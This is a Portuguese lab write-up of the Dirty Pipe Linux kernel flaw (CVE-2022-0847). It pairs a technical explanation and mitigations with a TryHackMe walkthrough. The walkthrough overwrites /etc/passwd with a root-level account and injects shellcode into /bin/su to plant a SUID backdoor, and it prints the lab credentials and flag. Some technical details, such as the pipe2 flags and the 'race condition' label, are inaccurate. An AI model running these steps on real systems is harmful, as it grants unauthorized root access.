<!--
title: CVE-2022-0847 — Dirty Pipe
desc: Explicação detalhada e exploit da falha Dirty Pipe no Kernel Linux, permitindo escrita arbitrária em arquivos read-only.
tags: cve, vulnerability, linux, privesc
readTime: 9 min
-->

<!-- ===================================== -->
<!--     Dirty Pipe — Kernel Exploitation  -->
<!-- ===================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/CVE-2022--0847-critical?style=for-the-badge">
  <img src="https://img.shields.io/badge/Impact-Privilege%20Escalation-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Layer-Linux%20Kernel-black?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Exploitability-Low%20Complexity-orange?style=flat-square">
  <img src="https://img.shields.io/badge/Access-Local-blue?style=flat-square">
  <img src="https://img.shields.io/badge/Offense-Red%20Team-black?style=flat-square">
  <img src="https://img.shields.io/badge/Defense-Patching%20%26%20Hardening-informational?style=flat-square">
</p>

---

# 🧨 Dirty Pipe — CVE-2022-0847  
## Análise Técnica e Exploração de Elevação de Privilégios no Kernel Linux

> Este documento apresenta uma **análise técnica profunda** da vulnerabilidade **Dirty Pipe (CVE-2022-0847)**, uma falha crítica no **kernel Linux** que permite a **elevação de privilégios local até root**, mesmo quando arquivos alvo estão abertos em modo **somente leitura**.
>
> Além da análise conceitual do bug, o material inclui **exploração prática em laboratório**, estudo do **código do exploit**, compreensão do **mecanismo interno do kernel**, impacto real em sistemas de produção e **recomendações de mitigação e hardening**.

---

## 🎯 Objetivos do Documento

- Entender **como a vulnerabilidade funciona internamente no kernel**
- Explicar a falha de **inicialização e reutilização de buffers de pipe**
- Demonstrar **exploração prática realista** em ambiente controlado
- Analisar **impacto em arquivos críticos e binários SUID**
- Aplicar **metodologia ofensiva com visão defensiva**
- Consolidar conhecimento em **Linux Kernel Exploitation**

---

## 📌 Metadados Técnicos

- **CVE:** CVE-2022-0847 (Dirty Pipe)
- **Categoria:** Kernel Exploitation · Linux Privilege Escalation
- **Tipo:** Elevação de privilégios local
- **Acesso inicial:** Usuário não privilegiado
- **Impacto final:** Execução de código como `root`
- **Ambiente:** Linux (kernels vulneráveis)
- **Metodologia:** Análise → Exploração → Impacto → Mitigação

---

## 🏷️ Tags

`#DirtyPipe` `#CVE2022_0847` `#LinuxKernel` `#PrivilegeEscalation`  
`#KernelExploitation` `#RedTeam` `#OffensiveSecurity`  
`#TryHackMe` `#LinuxSecurity`

---

## ⚠️ Aviso Legal

> Este material é destinado **exclusivamente para fins educacionais**, pesquisa de segurança, **laboratórios controlados** e **ambientes com autorização explícita**.  
> A exploração de vulnerabilidades em sistemas sem permissão é **ilegal** e pode resultar em sanções legais.

---

# Dirty Pipe: CVE-2022-0847 - Análise Técnica e Exploração

## Introdução Técnica

**CVE-2022-0847** (Dirty Pipe) é uma vulnerabilidade crítica de elevação de privilégios no kernel Linux descoberta por Max Kellerman em março de 2022. A vulnerabilidade permite que usuários não privilegiados sobrescrevam arquivos arbitrários no sistema, incluindo arquivos de sistema somente leitura, contornando completamente os mecanismos de controle de acesso tradicionais.

**Características principais:**

- **CVSS Score:** 7.8 (High)
- **Tipo:** Elevação de privilégios local
- **Sistemas afetados:** Kernel Linux 5.8 até 5.16.10, 5.15.25, 5.10.102
- **Complexidade:** Baixa - exploit público disponível
- **Impacto:** Execução de código como root

![DirtyPipez](https://miro.medium.com/v2/resize:fit:1400/1*yZA95k5P8EmSEERaIbqDGQ.png)

---
## Mecanismo Técnico da Vulnerabilidade

### Fundamentos do Kernel Linux

**Cache de Páginas:**

- Unidade mínima: página (tipicamente 4KB)
- Gerencia acesso a arquivos em disco
- Páginas são carregadas na memória quando arquivos são acessados

**Pipes e Splice():**

- `splice()`: Chamada de sistema que otimiza transferência de dados
- Move referências a páginas, não dados
- Permite direcionar pipes para páginas já carregadas na memória

### A Falha Crítica

**Sequência da vulnerabilidade:**

1. **Bug de inicialização (2016):**

```c
// Commit problemático: 241699cd72a8
// Permitia criação de pipes com flags arbitrárias
```

2. **Flag PIPE_BUF_FLAG_CAN_MERGE (2020):**

```c
// Commit: f6dd975583bd
// Flag que permite sobrescrita de dados em páginas
```

3. **Condição de exploração:**    
    - Pipe criado com `PIPE_BUF_FLAG_CAN_MERGE`
    - Arquivo aberto em modo somente leitura
    - `splice()` direciona pipe para página do arquivo
    - Escrita no pipe sobrescreve a página original

**Código vulnerável simplificado:**

```c
// Cenario de exploração
int fd = open("/etc/passwd", O_RDONLY);
pipe2(pipefd, O_CREAT | O_WRONLY);

// Força flag CAN_MERGE
// ... manipulação do pipe buffer ...

// Direciona pipe para página do arquivo
splice(fd, &offset, pipefd[1], NULL, 1, 0);

// Sobrescreve página
write(pipefd[1], malicious_data, sizeof(malicious_data));
```

---
## Exploração Prática - Laboratório TryHackMe

### Configuração do Ambiente

```bash
# Conexão SSH ao alvo
ssh tryhackme@<IP_ALVO>
# Senha: TryHackMe123!
```

### Exploit 1: Sobrescrita de /etc/passwd

#### 1. Preparação do Hash de Senha

```bash
# Gerar hash SHA512Crypt
openssl passwd -6 --salt THM "PASSWORD"
```

**Hash gerado:**

```bash
$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.
```

#### 2. Construção da Entrada Passwd

**Formato:**

```text
username:hash:UID:GID:GECOS:home:shell
```

**Entrada maliciosa:**

```text
usuario:$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.:0:0::/root:/bin/bash
```

#### 3. Determinação do Offset

```bash
# Encontrar offset da entrada "games"
grep -b "games" /etc/passwd
# Resultado: 189
```

 **O que é "byte offset" (189)?:**

O deslocamento indica onde, no arquivo, o exploit deve começar a escrever — em outras palavras, qual parte do arquivo será sobrescrita.

A vulnerabilidade não nos permite adicionar conteúdo ao arquivo, então teremos que escolher uma conta e sobrescrevê-la. Analisando o arquivo passwd, a conta "`games`" se destaca como um boa candidato para uma conta pouco usada que podemos nos dar ao luxo de excluir temporariamente. Podemos usar o `grep` com a opção `-b` para encontrar o deslocamento de "games" a partir do início do arquivo.

#### 4. Compilação e Execução do Exploit

```bash
cd ~/Exploit/PoC
gcc poc.c -o exploit

# Backup do passwd original
cp /etc/passwd /tmp/passwd.bak

# Executar exploração
./exploit /etc/passwd 189 'usuario:$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.:0:0::/root:/bin/bash'
```

#### 5. Verificação e Acesso

```bash
# Verificar entrada adicionada
tail -5 /etc/passwd

# Fazer login como usuário criado
su usuario
# Senha: PASSWORD

# Verificar privilégios
whoami  # root
id       # uid=0(root) gid=0(root)
```

#### 6. Capturando a flag

```bash
cd /root
cat flag.txt
```

**Resultado:**

```text
THM{MmU4Zjg0NDdjNjFiZWM5ZjUyZGEyMzlm}
```

### Exploit 2: Injeção em Binários SUID

#### 1. Compilação do Exploit Alternativo

```bash
cd ~/Exploit/Bl4sty
gcc dirtypipez.c -o dirtypipe_suid
```

#### 2. Mecanismo do Exploit

**Funcionamento:**

1. Identifica binário SUID (ex: `/bin/su`)
2. Injeta shellcode no binário via Dirty Pipe
3. Shellcode cria backdoor SUID em `/tmp`
4. Restaura binário original    
5. Executa backdoor para obter shell root

#### 3. Execução

```bash
# Executar exploit
./dirtypipe_suid /bin/su

# Backdoor criada em /tmp
ls -la /tmp/sh

# Executar backdoor
/tmp/sh -p
# Shell root obtido
```

---
## Análise Técnica do Código de Exploração

### Estrutura do Exploit Original (poc.c)

```c
// Principais funções:
int main(int argc, char **argv) {
    const char *path = argv[1];        // Arquivo alvo
    loff_t offset = atoll(argv[2]);    // Offset
    const char *data = argv[3];        // Dados a injetar
    
    // 1. Criação do pipe com flags manipuladas
    // 2. Preparação do buffer do pipe
    // 3. Uso de splice() para direcionar ao arquivo
    // 4. Escrita dos dados maliciosos
}
```


### Técnicas de Bypass Implementadas

1. **Manipulação de Pipe Flags:**

```c
// Força flag PIPE_BUF_FLAG_CAN_MERGE
for (int i = 0; i < 16; i++) {
    write(pipefd[1], "A", 1);
}
```

2. **Uso de splice() para Redirecionamento:**

```c
// Conecta pipe à página do arquivo
loff_t offset = atoll(argv[2]);
ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
```

3. **Preservação de Binários SUID:**

```c
// Dirty Pipe não remove bit SUID ao escrever
// Diferente de write() normal que limparia SUID
```

---
## Mitigações e Correções

### Versões Corrigidas

| Versão do Kernel | Versão Corrigida | Data do Patch |
| ---------------- | ---------------- | ------------- |
| 5.16.x           | 5.16.11+         | Março 2022    |
| 5.15.x           | 5.15.25+         | Março 2022    |
| 5.10.x           | 5.10.102+        | Março 2022    |

### Patch Aplicado

**Commit de correção principal:**

```c
// Corrige inicialização inadequada de pipe flags
// Remove capacidade de definir PIPE_BUF_FLAG_CAN_MERGE arbitrariamente
```

### Verificação do Sistema

```bash
# Verificar versão do kernel
uname -r

# Verificar se vulnerável
# Versões entre 5.8 e as corrigidas são vulneráveis

# Script de verificação rápida
cat > check_dirtypipe.sh << 'EOF'
#!/bin/bash
KERNEL=$(uname -r | cut -d. -f1-3)
VULN_VERSIONS=("5.8" "5.9" "5.10" "5.11" "5.12" "5.13" "5.14" "5.15" "5.16")

for version in "${VULN_VERSIONS[@]}"; do
    if [[ "$KERNEL" == "$version"* ]]; then
        echo "[!] Kernel $KERNEL pode ser vulnerável ao Dirty Pipe"
        echo "[!] Atualize para versão corrigida"
        exit 1
    fi
done

echo "[+] Kernel $KERNEL não parece vulnerável"
EOF

chmod +x check_dirtypipe.sh
./check_dirtypipe.sh
```

## Impacto e Implicações de Segurança

### Cenários de Ataque

1. **Elevação de Privilégios Local:**
    - Sobrescrita de `/etc/passwd` ou `/etc/shadow`
    - Modificação de binários SUID        
    - Injeção de código em processos privilegiados

2. **Bypass de Controles de Segurança:**
    - Sistemas de arquivos somente leitura
    - SELinux/AppArmor (dependendo da configuração)        
    - Contêineres (escape potencial)

3. **Persistência:**
    
    - Modificação de binários do sistema
    - Injeção em serviços systemd
    - Backdoors em bibliotecas compartilhadas

### Estatísticas de Impacto

- **Dispositivos afetados:** Milhões de sistemas Linux
- **Incluindo:** Servidores, desktops, dispositivos IoT, Android
- **Tempo de patch:** ~1 semana após divulgação
- **Exploits públicos:** Múltiplas variantes disponíveis

## Lições Aprendidas

### Para Desenvolvedores do Kernel

1. **Validação Rigorosa de Flags:**

```c
// Sempre validar flags de usuário
if (flags & ~VALID_PIPE_FLAGS) {
    return -EINVAL;
}
```

2. **Separação de Privilégios:**    
    - Operações de kernel não devem confiar em dados de usuário
    - Verificar permissões em múltiplos níveis

3. **Revisão de Código Histórico:**
    - Bugs introduzidos anos antes podem se tornar vulneráveis
    - Mudanças aparentemente inócuas podem criar condições de exploração

### Para Administradores de Sistema

1. **Atualizações Imediatas:**

```bash
# Atualização crítica de kernel
sudo apt update && sudo apt upgrade linux-image-$(uname -r)
```

2. **Monitoramento Proativo:**

```bash
# Monitorar modificações em arquivos críticos
auditctl -w /etc/passwd -p wa -k critical_files
auditctl -w /etc/shadow -p wa -k critical_files
```

3. **Hardening Adicional:**

```bash
# Implementar medidas defensivas
# 1. Kernel modules signing
# 2. Lockdown mode
# 3. SELinux/AppArmor em modo enforcing
```

---
## Conclusão

O Dirty Pipe (CVE-2022-0847) representa uma vulnerabilidade crítica que demonstra a complexidade da segurança em sistemas operacionais modernos. A combinação de um bug histórico (2016) com uma nova funcionalidade (2020) criou uma condição de exploração poderosa que permitiu bypass completo de permissões de arquivo.

**Pontos-chave:**

1. **Natureza da vulnerabilidade:** Condição de corrida + má inicialização de flags
    
2. **Impacto:** Elevação completa para root a partir de usuário não privilegiado
    
3. **Exploração:** Múltiplos vetores (passwd, binários SUID, etc.)
    
4. **Correção:** Atualização imediata do kernel necessária
    
5. **Lições:** Importância de validação rigorosa e revisão de código histórico
    

**Recomendações finais:**

- Manter sistemas atualizados com patches de segurança
    
- Implementar monitoramento de integridade de arquivos
    
- Revisar configurações de segurança regularmente
    
- Educar equipes sobre ameaças de kernel-level
    

A exploração bem-sucedida deste laboratório não apenas demonstra a técnica de ataque, mas também destaca a importância crítica de uma postura de segurança proativa em ambientes Linux. Vulnerabilidades no kernel representam o nível mais profundo de ameaça e exigem resposta e mitigação imediatas.
